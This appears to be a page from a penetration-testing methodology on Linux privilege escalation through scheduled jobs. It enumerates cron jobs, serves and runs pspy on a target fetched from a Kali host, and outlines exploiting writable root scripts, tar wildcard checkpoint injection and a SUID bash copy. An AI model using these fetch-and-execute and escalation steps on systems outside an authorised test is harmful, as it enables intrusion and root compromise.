# LPRIV-05. Scheduled execution and pspy

**Run this when:** you need to identify recurring privileged commands or already observed a scheduled consumer.

```bash
cat /etc/crontab 2>/dev/null
find /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly -type f -ls 2>/dev/null
SYSTEMD_PAGER=cat systemctl list-timers --all --no-pager 2>/dev/null
crontab -l 2>/dev/null
```

**Look for:** root jobs, writable scripts, relative commands, writable working directories, shell-expanded wildcards, and a known natural trigger.

**If found:** writable or replaceable paths go to [LPRIV-06](./lpriv-06). Exact service and process attribution goes to [LPRIV-07](./lpriv-07). Execute only after [LPRIV-14](./lpriv-14) records the preconditions and recovery.

## Observe short-lived jobs with pspy

Prepare the matching pspy binary on Kali, then serve only its directory. On the target, use a fresh file on an executable mount.

```bash
# Kali
uname -m
find /usr/share/pspy "$PWD" -maxdepth 2 -type f -name 'pspy*' -ls 2>/dev/null
test -f pspy64 || wget 'https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64' -O pspy64
ip -br -4 addr
ss -lnt
python3 -m http.server '<PORT>' --bind '<KALI_IP>' --directory '<DIRECTORY_WITH_PSPY>'

# Target
url='http://<KALI_IP>:<PORT>/<PSPY_FILENAME>'
dst=$(mktemp '<WRITABLE_EXECUTABLE_DIRECTORY>/pspy.XXXXXX') || exit 1
if command -v curl >/dev/null 2>&1; then
  curl -fL "$url" -o "$dst"
elif command -v wget >/dev/null 2>&1; then
  wget "$url" -O "$dst"
elif command -v python3 >/dev/null 2>&1; then
  URL="$url" DST="$dst" python3 -c \
    'import os, urllib.request; urllib.request.urlretrieve(os.environ["URL"], os.environ["DST"])'
else
  printf 'No curl, wget, or python3; use an allowed transfer method.\n' >&2
  rm -f -- "$dst"
  exit 1
fi
[ -s "$dst" ] || { rm -f -- "$dst"; printf 'Transfer failed.\n' >&2; exit 1; }
chmod +x "$dst" && "$dst"
```

**Look for:** recurring UID 0 commands, credentials in arguments, and scripts or binaries launched from writable paths.

Stop pspy with `Ctrl+C`, remove only `"$dst"`, then stop the Kali server. The transfer branch removes its empty temporary file on failure.

## Preserve exact scheduled-path cases

For a writable script consumed by a higher-privileged job, record its inode, mode, owner, ACL, and SHA-256. Make a private backup. Append one proof command only when the bytes and metadata still match, wait for the natural trigger, then restore the original in place and verify the hash and ACL. Never restart the scheduler to force execution.

For GNU tar wildcard execution, require an observed unquoted `*`, a writable working directory, GNU tar checkpoint support, and the natural trigger. Create fresh `--checkpoint=1`, `--checkpoint-action=exec=...`, and proof-script names, then remove exactly those names after the result.

The retired temporary foreground-shell case copied a verified GNU Bash into a private directory through an already proved root job and applied mode 4755. Keep its `nosuid`, `noexec`, `NoNewPrivs`, backup, natural-trigger, verification, restoration, and exact-file removal checks. Prefer an identity proof file when a shell is unnecessary.

```bash
stat -c '%d:%i %a %u:%g %n' -- '<SCHEDULED_SCRIPT_OR_WORKING_DIRECTORY>'
getfacl -p -- '<SCHEDULED_SCRIPT_OR_WORKING_DIRECTORY>' 2>/dev/null
sha256sum -- '<SCHEDULED_SCRIPT>' 2>/dev/null
```

**If nothing stands out:** continue to [LPRIV-06](./lpriv-06).
